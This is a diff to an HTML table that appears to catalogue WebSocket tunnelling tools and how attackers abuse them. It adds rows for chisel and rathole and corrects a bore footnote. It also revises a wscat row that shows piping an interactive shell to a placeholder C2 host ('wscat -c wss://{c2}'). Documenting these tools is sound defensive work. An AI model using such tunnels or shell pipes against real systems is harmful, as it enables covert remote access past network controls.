@@ -734,10 +734,22 @@
             <td><span class="status-badge status-documented">Documented</span></td>
         </tr>
         <tr>
-            <td class="name-cell">(Footnote) chisel, rathole, bore</td>
-            <td class="endpoint-cell">*not* WS</td>
-            <td class="abuse-cell">Frequently confused with WS tunnels — chisel is HTTP-based, rathole uses Noise <span class="dir-tag">(—)</span></td>
+            <td class="name-cell">(Footnote) bore</td>
+            <td class="endpoint-cell"><code>*not* WS</code></td>
+            <td class="abuse-cell">Frequently confused with WS tunnels: bore uses its own raw-TCP protocol. (chisel and rathole <em>do</em> use WebSocket, see their rows) <span class="dir-tag">(—)</span></td>
             <td><span class="status-badge status-note">Note</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">chisel</td>
+            <td class="endpoint-cell"><code>wss://{server}/ (Sec-WebSocket-Protocol: chisel-v3)</code></td>
+            <td class="abuse-cell">SSH-over-WebSocket TCP/UDP tunnel and SOCKS proxy; a staple in ransomware and APT intrusions <span class="dir-tag">(INT→EXT / EXT→INT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">rathole</td>
+            <td class="endpoint-cell"><code>transport.type = "websocket"</code></td>
+            <td class="abuse-cell">NAT-traversal reverse proxy with optional WebSocket (+TLS) transport for CDN-friendly egress <span class="dir-tag">(EXT→INT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
         </tr>
         <tr>
             <td class="name-cell">Mythic</td>
@@ -778,8 +790,8 @@
         <tr>
             <td class="name-cell"><code>wscat</code> (npm)</td>
             <td class="endpoint-cell"></td>
-            <td class="abuse-cell">Pipe interactive shell through WS: `wscat -c wss://c2 \\ <span class="dir-tag">(cmd`)</span></td>
-            <td><span class="status-badge status-note">INT</span></td>
+            <td class="abuse-cell">Interactive WS client: pipe a shell through it (<code>wscat -c wss://{c2}</code>) <span class="dir-tag">(INT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
         </tr>
         <tr>
             <td class="name-cell"><code>websocat</code></td>
